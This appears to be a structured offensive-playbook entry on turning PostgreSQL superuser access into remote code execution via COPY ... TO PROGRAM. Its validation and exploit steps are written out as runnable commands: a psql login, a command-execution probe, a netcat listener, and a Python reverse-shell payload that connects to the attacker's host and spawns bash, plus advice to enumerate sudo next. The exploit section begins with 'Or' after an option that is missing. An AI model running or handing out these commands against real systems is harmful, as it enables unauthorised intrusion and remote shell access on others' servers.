techniques.title: PostgreSQL COPY ... TO/FROM PROGRAM → RCE
preconditions: authenticated database access as a superuser (e.g. the 'postgres' role)
often reached locally after a foothold (psql -h 127.0.0.1), or with weak/known DB creds
techniques.notes: A superuser can run OS commands via COPY ... TO PROGRAM (write path) or COPY ... FROM PROGRAM (read path). Frequently the pivot from an initial foothold to a second service bound to localhost. Not a CVE — a built-in feature that is dangerous when the connecting role is superuser.
validate_steps: Connect: psql -U postgres -h 127.0.0.1 -p 5432   (use discovered/known creds; often reachable only from localhost after a foothold).
Confirm command execution is possible (read-only probe): COPY (SELECT '') TO PROGRAM 'id > /tmp/pg_test.txt';  then read /tmp/pg_test.txt.
A superuser role + successful probe = exploitable.
exploit_steps: Listener on your box: rlwrap -cAr nc -lvnp {lport}

Or (no /dev/tcp): COPY (SELECT '') TO PROGRAM 'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),x) for x in (0,1,2)];subprocess.call([\"/bin/bash\",\"-i\"])"';
Shell returns as the postgres OS user; then enumerate (id, sudo -l) for the next step.
